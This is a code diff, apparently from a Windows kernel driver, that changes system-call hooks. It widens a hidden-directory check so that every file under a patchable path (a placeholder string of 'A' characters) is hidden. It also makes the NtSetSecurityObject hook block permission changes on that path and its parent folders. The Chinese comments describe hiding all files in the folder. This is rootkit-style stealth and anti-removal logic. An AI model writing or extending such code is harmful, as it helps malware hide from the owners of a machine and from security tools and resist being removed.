@@ -234,7 +234,7 @@ HOOK_CONTEXT g_hook_table[] = {
 		{ L"NtSetSecurityObject", NULL, NULL, (void *)HOOK_NtSetSecurityObject }, //4
 };
 
-WCHAR g_HideDir[512] = L"C:\\hide\0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+WCHAR g_HideDir[512] = L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
 enum _XXXXXXXXXXXXXX
 {
@@ -1107,7 +1107,10 @@ void clean_backslash(WCHAR  *str)
 BOOLEAN av_IsFileNameInHideList(WCHAR *fileName)
 {
 	dbg_msg("test file %S ", fileName);
-	if (_wcsicmp(fileName, g_HideDir) == 0)
+	//if (_wcsicmp(fileName, g_HideDir) == 0)
+	//文件夹下面所有的文件全部隐藏
+	// TODO : 使用 wcstr 效率太差了 。。自己写个比较的函数
+	if (wcsstr(fileName,g_HideDir))
 	{
 		return TRUE;
 	}
@@ -1389,7 +1392,7 @@ NTSTATUS  HOOK_NtSetSecurityObject(IN HANDLE Handle,
 		{
 			// TODO  对父文件夹 也做出限制
 			dbg_msg("try set file %S sec info ", FileName);
-			if (wcsstr(FileName, g_HideDir))
+			if (wcsstr(FileName, g_HideDir) || wcsstr(g_HideDir, FileName))
 			{
 				//找到了。。。 拒绝设置该文件的权限。。
 				av_Free(FileName);
